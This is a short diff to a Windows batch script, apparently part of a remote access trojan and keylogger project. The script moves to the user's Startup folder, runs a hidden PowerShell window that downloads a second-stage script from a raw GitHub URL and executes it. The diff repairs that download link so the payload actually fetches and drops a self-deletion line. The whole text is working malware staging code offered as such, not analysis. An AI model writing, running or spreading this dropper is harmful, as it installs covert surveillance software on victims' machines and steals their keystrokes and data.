@@ -9,11 +9,10 @@ set STARTUP="C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Pr
 cd %STARTUP% 
 
 @REM run stage2
-powershell -c powershell.exe -WindowStyle hidden "Invoke-WebRequest -Uri 'https://github.com/huynh044/RATProject/blob/main/key_logger/important_file/wget.cmd' -OutFile 'wget.cmd'"
-powershell ".\wget.cmd"
-
+powershell -c powershell.exe -WindowStyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/key_logger/important_file/wget.cmd' -OutFile 'wget.cmd'"
+powershell .\wget.cmd
 
 @REM back to last path
 cd %INITIAL%
-del inital.cmd
+
 
